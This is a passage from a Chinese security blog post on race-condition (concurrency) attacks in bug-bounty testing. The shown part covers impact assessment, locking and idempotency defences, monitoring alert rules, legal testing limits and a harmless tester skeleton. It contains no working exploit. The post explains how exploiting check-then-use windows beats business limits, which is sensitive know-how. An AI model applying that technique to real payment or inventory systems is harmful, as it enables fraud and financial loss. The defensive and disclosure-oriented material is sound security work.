<li><strong>系统日志</strong>：是否产生异常日志条目</li>
<li><strong>数据一致性</strong>：数据库记录是否符合预期</li>
<li><strong>响应差异</strong>：并发请求的响应是否不同</li>
</ol>
<p><strong>危害等级评估</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">高危：直接导致资金损失、资源耗尽</span><br><span class="line">中危：绕过业务限制、获取不当利益</span><br><span class="line">低危：产生脏数据、轻微资源浪费</span><br></pre></td></tr></table></figure>

<h2 id="五、防御方案与修复建议"><a href="#五、防御方案与修复建议" class="headerlink" title="五、防御方案与修复建议"></a>五、防御方案与修复建议</h2><h3 id="5-1-技术防护措施"><a href="#5-1-技术防护措施" class="headerlink" title="5.1 技术防护措施"></a>5.1 技术防护措施</h3><h4 id="数据库层面"><a href="#数据库层面" class="headerlink" title="数据库层面"></a><strong>数据库层面</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 使用事务和行锁（悲观锁）</span></span><br><span class="line"><span class="keyword">BEGIN</span> TRANSACTION;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> accounts <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">FOR</span> <span class="keyword">UPDATE</span>;</span><br><span class="line"><span class="keyword">UPDATE</span> accounts <span class="keyword">SET</span> balance <span class="operator">=</span> balance <span class="operator">-</span> <span class="number">100</span> <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 使用乐观锁（版本控制）</span></span><br><span class="line"><span class="keyword">UPDATE</span> products </span><br><span class="line"><span class="keyword">SET</span> stock <span class="operator">=</span> stock <span class="operator">-</span> <span class="number">1</span>, version <span class="operator">=</span> version <span class="operator">+</span> <span class="number">1</span> </span><br><span class="line"><span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">100</span> <span class="keyword">AND</span> version <span class="operator">=</span> <span class="number">5</span> <span class="keyword">AND</span> stock <span class="operator">&gt;</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<h4 id="应用层面"><a href="#应用层面" class="headerlink" title="应用层面"></a><strong>应用层面</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用分布式锁（Redis）</span></span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">from</span> redis.lock <span class="keyword">import</span> Lock</span><br><span class="line"></span><br><span class="line">redis_client = redis.Redis()</span><br><span class="line">lock = Lock(redis_client, <span class="string">&quot;lock:order:123&quot;</span>, timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> lock:</span><br><span class="line">    <span class="comment"># 执行核心业务逻辑</span></span><br><span class="line">    process_order(order_id)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用数据库唯一约束</span></span><br><span class="line">CREATE TABLE orders (</span><br><span class="line">    <span class="built_in">id</span> BIGINT PRIMARY KEY,</span><br><span class="line">    user_id BIGINT,</span><br><span class="line">    order_no VARCHAR(<span class="number">64</span>) UNIQUE,  -- 唯一订单号</span><br><span class="line">    created_at TIMESTAMP</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h4 id="架构层面"><a href="#架构层面" class="headerlink" title="架构层面"></a><strong>架构层面</strong></h4><ol>
<li><p><strong>幂等性设计</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用唯一业务流水号</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/payment&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Response <span class="title function_">payment</span><span class="params">(<span class="meta">@RequestParam</span> String orderId, </span></span><br><span class="line"><span class="params">                       <span class="meta">@RequestParam</span> String bizSeqNo)</span> &#123;</span><br><span class="line">    <span class="comment">// 检查bizSeqNo是否已处理</span></span><br><span class="line">    <span class="keyword">if</span> (redis.exists(<span class="string">&quot;processed:&quot;</span> + bizSeqNo)) &#123;</span><br><span class="line">        <span class="keyword">return</span> Response.success(<span class="string">&quot;重复请求，已处理&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 处理业务</span></span><br><span class="line">    redis.setex(<span class="string">&quot;processed:&quot;</span> + bizSeqNo, <span class="number">3600</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>消息队列顺序消费</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户请求 → 消息队列 → 顺序消费者 → 业务处理</span><br><span class="line">      ↑                    ↑</span><br><span class="line">  高并发写入           单线程顺序处理</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="5-2-业务逻辑防护"><a href="#5-2-业务逻辑防护" class="headerlink" title="5.2 业务逻辑防护"></a>5.2 业务逻辑防护</h3><p><strong>关键检查点</strong>：</p>
<ol>
<li><strong>状态机验证</strong>：确保状态转换符合预设流程</li>
<li><strong>前置条件校验</strong>：在事务开始前完成所有检查</li>
<li><strong>后置条件确认</strong>：操作完成后验证业务一致性</li>
<li><strong>补偿机制</strong>：异常时自动回滚或告警</li>
</ol>
<h3 id="5-3-监控与告警"><a href="#5-3-监控与告警" class="headerlink" title="5.3 监控与告警"></a>5.3 监控与告警</h3><p><strong>监控指标</strong>：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">异常模式检测：</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">同一用户高频并发请求</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">相同参数重复提交</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">业务结果异常（如负库存）</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">事务回滚率突增</span></span><br><span class="line"></span><br><span class="line"><span class="string">告警规则：</span></span><br><span class="line"><span class="bullet">-</span> <span class="number">1</span><span class="string">分钟内同一接口并发请求&gt;100次</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">账户余额在1秒内多次变动</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">优惠券使用频率异常</span></span><br></pre></td></tr></table></figure>

<h2 id="六、合法测试注意事项"><a href="#六、合法测试注意事项" class="headerlink" title="六、合法测试注意事项"></a>六、合法测试注意事项</h2><h3 id="6-1-测试边界"><a href="#6-1-测试边界" class="headerlink" title="6.1 测试边界"></a>6.1 测试边界</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">✅ 允许的操作：</span><br><span class="line">- 使用测试账户、测试资金</span><br><span class="line">- 小额测试（如0.01元）</span><br><span class="line">- 可控数量的并发（如10-50个）</span><br><span class="line">- 测试后主动修复数据</span><br><span class="line"></span><br><span class="line">❌ 禁止的操作：</span><br><span class="line">- 对生产用户造成实际损失</span><br><span class="line">- 大规模并发导致服务瘫痪</span><br><span class="line">- 利用漏洞获取实际利益</span><br><span class="line">- 不报告漏洞继续利用</span><br></pre></td></tr></table></figure>

<h3 id="6-2-报告要点"><a href="#6-2-报告要点" class="headerlink" title="6.2 报告要点"></a>6.2 报告要点</h3><p><strong>漏洞报告应包括</strong>：</p>
<ol>
<li>漏洞位置：具体的API接口</li>
<li>复现步骤：详细的测试过程</li>
<li>测试数据：使用的参数和payload</li>
<li>时间窗口：估算的竞态窗口大小</li>
<li>影响范围：可能影响的用户和数据</li>
<li>修复建议：具体的技术方案</li>
</ol>
<h3 id="6-3-风险控制"><a href="#6-3-风险控制" class="headerlink" title="6.3 风险控制"></a>6.3 风险控制</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安全的测试脚本示例</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SafeRaceTester</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, target_url</span>):</span><br><span class="line">        <span class="variable language_">self</span>.url = target_url</span><br><span class="line">        <span class="variable language_">self</span>.test_user_id = <span class="string">&quot;test_user_001&quot;</span>  <span class="comment"># 专用测试账号</span></span><br><span class="line">        <span class="variable language_">self</span>.test_amount = <span class="number">0.01</span>  <span class="comment"># 最小测试金额</span></span><br><span class="line">        <span class="variable language_">self</span>.max_concurrent = <span class="number">20</span>  <span class="comment"># 限制并发数</span></span><br><span class="line">        <span class="variable language_">self</span>.test_data = &#123;</span><br><span class="line">            <span class="string">&quot;user_id&quot;</span>: <span class="variable language_">self</span>.test_user_id,</span><br><span class="line">            <span class="string">&quot;amount&quot;</span>: <span class="variable language_">self</span>.test_amount,</span><br><span class="line">            <span class="string">&quot;biz_no&quot;</span>: <span class="string">f&quot;TEST_<span class="subst">&#123;<span class="built_in">int</span>(time.time())&#125;</span>&quot;</span>  <span class="comment"># 唯一标识</span></span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cleanup</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 测试后清理数据</span></span><br><span class="line">        revert_test_transactions(<span class="variable language_">self</span>.test_user_id)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="总结要点"><a href="#总结要点" class="headerlink" title="总结要点"></a>总结要点</h2><ol>
<li><strong>并发攻击的核心</strong>：利用”检查-使用”时间窗口，绕过业务限制</li>
<li><strong>高危场景</strong>：金融交易、资源限制、库存管理、状态变更</li>
<li><strong>攻击成功的关键</strong>：精准的时间控制和足够的并发压力</li>
<li><strong>防御的根本</strong>：原子操作、分布式锁、幂等设计、状态机验证</li>
<li><strong>合法测试的原则</strong>：最小影响、主动修复、完整报告</li>
</ol>
<p>并发攻击是逻辑漏洞中最具技术挑战性的一类，需要测试者深入理解业务逻辑、掌握高并发技术、并具备严谨的测试伦理。在企业SRC测试中，发现此类漏洞往往能获得较高评级，因其直接关系到企业的核心业务安全和资金安全。</p>
</div>
        </div>
        
            <div class="kratos-copyright text-center clearfix">
                <span itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</span>
            </div>
        
        <footer class="kratos-entry-footer clearfix">
            
            
            
                <div class="post-actions text-center clearfix" id="post-actions">
                
                    <a class="donate" href="javascript:;" onclick="krOpenDonateModal()"><i class="fa fa-bitcoin"></i> 打赏</a>
                
                
                    <a class="share" href="javascript:;" onclick="krOpenShareModal()"><i class="fa fa-share-alt"></i> 分享</a>
                
                </div>
            
            <div class="footer-tag clearfix">
                <div class="pull-left">
                <i class="fa fa-tags"></i>
                    <a class="tag-none-link" href="/tags/Src/" rel="tag">Src</a>
                </div>
                <div class="pull-date">
                    <time datetime="2025-12-31T02:54:06.208Z" itemprop="dateModified">最后编辑：2025-12-31</time>
                </div>
            </div>
        </footer>
    </div>
    
        <nav class="navigation post-navigation clearfix" role="navigation">
            
            <div class="nav-previous clearfix">
                <a title=" 在企业SRC中挖掘DoS（拒绝服务）漏洞的详细知识点与漏洞利用方式指南" href="/2025/12/15/在企业SRC中挖掘DoS（拒绝服务）漏洞的详细知识点与漏洞利用方式指南/"><i class="fa fa-angle-left"></i> 上一篇</a>
            </div>
            
            
            <div class="nav-next clearfix">
                <a title=" 支付逻辑漏洞完全指南：攻击手法与防御策略" href="/2025/12/15/支付逻辑漏洞完全指南：攻击手法与防御策略/">下一篇 <i class="fa fa-angle-right"></i></a>
            </div>
            
        </nav>
    
    
        <div class="comment-post">
            <div id="gitalk-container" class="kr-comments lazy-load" data-path="/2025/12/15/%E5%B9%B6%E5%8F%91%E6%94%BB%E5%87%BB%EF%BC%88%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%EF%BC%89%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97%EF%BC%9A%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/" data-path-hash="c8afd26b4c0ff140775c7ce076c53fa5"></div>
        </div>
    
</article>

        

            </section>

            
                

<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
    
    
                <aside id="krw-about" class="widget widget-kratos-about clearfix">
    <div class="photo-background"></div>
    <div class="photo-wrapper clearfix">
        <div class="photo-wrapper-tip text-center">
            <img class="about-photo" src="/images/user.svg" alt="wj-stack" loading="lazy" decoding="auto" />
        </div>
    </div>
    <div class="textwidget">
        <p class="text-center"></p>
    </div>
    <div class="site-meta">
        <a class="meta-item" href="/archives/">
            <span class="title">
                文章
            </span>
            <span class="count">
                18
            </span>
        </a>
        <a class="meta-item" href="/categories/">
            <span class="title">
                分类
            </span>
            <span class="count">
                0
            </span>
        </a>
        <a class="meta-item" href="/tags/">
            <span class="title">
                标签
            </span>
            <span class="count">
                2
            </span>
        </a>
    </div>
</aside>
            
                    <div class="sticky-area">
                
                

            
                
  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
      <div class="tag-clouds">
        <a href="/tags/Packet-Capture/" style="font-size: 0.6em;">Packet Capture</a> <a href="/tags/Src/" style="font-size: 0.8em;">Src</a>
      </div>
  </aside>

            
                
  <aside id="krw-posts" class="widget widget-kratos-posts">
  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
  <div class="tab-content">
      <ul class="list-group">
        
        
          
          
            <a class="list-group-item" href="/2025/12/31/%E7%AC%AC%E4%BA%94%E6%9C%9F%EF%BC%9APacket-Capture-%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%EF%BC%88IPMB%EF%BC%89/"><i class="fa fa-book"></i> 第五期：Packet Capture - 进程间通信（IPMB）</a>
            
          
        
          
          
            <a class="list-group-item" href="/2025/12/31/%E7%AC%AC%E5%9B%9B%E6%9C%9F%EF%BC%9APacket-Capture-API-Hook%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3/"><i class="fa fa-book"></i> 第四期：Packet Capture - API Hook技术详解</a>
            
          
        
          
          
            <a class="list-group-item" href="/2025/12/31/%E7%AC%AC%E4%B8%89%E6%9C%9F%EF%BC%9APacket-Capture-DLL%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF%E6%B7%B1%E5%85%A5/"><i class="fa fa-book"></i> 第三期：Packet Capture - DLL注入技术深入</a>
            
          
        
          
          
            <a class="list-group-item" href="/2025/12/31/%E7%AC%AC%E4%BA%8C%E6%9C%9F%EF%BC%9APacket-Capture-%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84%E8%AF%A6%E8%A7%A3/"><i class="fa fa-book"></i> 第二期：Packet Capture - 技术架构详解</a>
            
          
        
          
          
            <a class="list-group-item" href="/2025/12/31/%E7%AC%AC%E4%B8%80%E6%9C%9F%EF%BC%9APacket-Capture-%E9%A1%B9%E7%9B%AE%E4%BB%8B%E7%BB%8D%E4%B8%8E%E8%83%8C%E6%99%AF/"><i class="fa fa-book"></i> 第一期：Packet Capture - 项目介绍与背景</a>
            
          
        
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
      </ul>
  </div>
  </aside>

            
    </div>
</section>
            

        

                </div>
    </div>
</div>

<footer>
    <div id="footer">
        <div class="container">
            <div class="row">
                <div class="col-md-6 col-md-offset-3 footer-list text-center">
                    <ul class="kratos-social-icons">
                        
                            <li>
                                <a href="https://github.com/wj-stack" target="_blank" rel="nofollow">
                                    <i class="fa fa-github"></i>
                                </a>
                            </li>
                        
                            <li>
                                <a href="/atom.xml" target="_blank" rel="nofollow">
                                    <i class="fa fa-rss"></i>
                                </a>
                            </li>
                        
                    </ul>
                    <ul class="kratos-copyright">
                        <div>
                            <li>&copy; 2025 wj-stack 's Blog 版权所有.</li>
                            <li>本站已在风雨中飘摇<span id="kr-since">Loading...</span></li>
                        </div>
                        <div>
                            <li>自豪地使用 <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a> 主题</li>
                            <li>站点由 <a href="https://github.com/Candinya/Kratos-Rebirth/graphs/contributors" target="_blank">wj-stack</a> 用 <i class="fa fa-heart" style="color:#d43f57"></i> 搭建</li>
                        </div>
                        <!-- 额外的追加注入项 -->
                        
                            <div>
                                
                                    <li>由 <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a> 强力驱动</li>
                                
                                    <li>在 <a href="https://github.io" target="_blank">Github Pages</a> 暖心托管</li>
                                
                            </div>
                        
                    </ul>
                </div>
            </div>
        </div>
        <div class="kr-tool text-center">
            <div class="tool">
                
                    <div class="box search-box">
                        <a href="/search">
                            <span class="fa fa-search"></span>
                        </a>
                    </div>
                
                <div class="box theme-box" id="theme-toggle">
                    <span class="fa fa-adjust"></span>
                </div>
            </div>
            <div id="gotop-box" class="box gotop-box">
                <span class="fa fa-chevron-up"></span>
            </div>
        </div>
    </div>
</footer>
</div>
</div>


    <div id="kr-donate-modal" class="kr-modal">
    <div class="kr-modal-bg" onclick="krCloseDonateModal()"></div>
    <div class="kr-modal-content">
        <div class="kr-modal-header">
            <div class="kr-modal-icon">
                <i class="fa fa-bitcoin"></i>
            </div>
            <div class="kr-modal-title">赞助喵</div>
            <button class="kr-modal-close" onclick="krCloseDonateModal()">
                <i class="fa fa-times-circle"></i>
            </button>
        </div>
        <div class="kr-modal-body">
            <div class="kr-donate-message">非常感谢您的喜欢！ <i class="fa fa-heart" style="color:#d43f57"></i></div>
            <div class="kr-donate-qr" id="kr-donate-qr">
                
                    <img class="kr-donate-placeholder" src="https://dev.krt.moe/demo-assets/donate.webp" alt="赞助喵" />
                
            </div>
            <div class="kr-donate-platforms">
                
                    
                        <button class="kr-donate-platform-button" style="color: skyblue;" title="模拟支付" onclick="krDonateModalShowPlatformQR('example_payment', 'skyblue')">
                            <i class="fa fa-credit-card"></i>
                        </button>
                    
                
            </div>
        </div>
    </div>
</div>
<script defer src="/js/kr-modal/donate.min.js"></script>




    <div id="kr-share-modal" class="kr-modal">
    <div class="kr-modal-bg" onclick="krCloseShareModal()"></div>
    <div class="kr-modal-content">
        <div class="kr-modal-header">
            <div class="kr-modal-icon">
                <i class="fa fa-share-alt"></i>
            </div>
            <div class="kr-modal-title">分享这一刻</div>
            <button class="kr-modal-close" onclick="krCloseShareModal()">
                <i class="fa fa-times-circle"></i>
            </button>
        </div>
        <div class="kr-modal-body">
            <div class="kr-share-message">让朋友们也来瞅瞅！</div>
            <div class="kr-share-qr" id="kr-share-qr"></div>
            <div class="kr-share-platforms">
                
                    <button class="kr-share-platform-button" style="color: #62b6e7;" title="喵窝" onclick="krShareModalOpenPlatform('https://nya.one/share?text=%3E%20$TITLE%0A%3E%0A%3E%20$SUMMARY%0A----%20$SITE%0A%0A$URL')">
                        <svg fill="currentColor" width="18" height="18" viewBox="0 0 329 388"><path d="M0,36.226c0,-19.993 16.233,-36.226 36.226,-36.226c13.788,0 25.787,7.719 31.908,19.068l188.366,229.845l0,-111.259c-6.356,5.508 -14.645,8.843 -23.707,8.843c-19.994,0 -36.226,-16.232 -36.226,-36.226c-0,-8.551 2.968,-16.413 7.93,-22.613l-0.015,-0.013l56.614,-69.08c6.2,-11.073 18.047,-18.565 31.63,-18.565c19.994,0 36.227,16.233 36.227,36.226l-0,314.644c-0,19.994 -16.233,36.226 -36.227,36.226c-13.166,0 -24.701,-7.039 -31.044,-17.555l-189.229,-230.899l-0,212.228c-0,19.994 -16.233,36.226 -36.227,36.226c-19.993,0 -36.226,-16.232 -36.226,-36.226l0,-314.644Z" /></svg>
                    </button>
                
            </div>
        </div>
    </div>
</div>
<script defer src="/js/kr-modal/share.min.js"></script>



<!-- 额外的追加注入项 -->


        <script>
    if (!window.kr) {
        window.kr = {};
    }
    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
    window.kr.siteRoot = "/";
</script>


  <script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>



  <script defer src="/vendors/viewerjs@1.11.6/dist/viewer.min.js"></script>


<script defer src="/js/kr-core.min.js"></script>


  <script defer src="/js/kr-pjax.min.js"></script>


<!-- 额外的追加注入项 -->

  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
<script src="/comments/gitalk.js"></script>



    </body>
</html>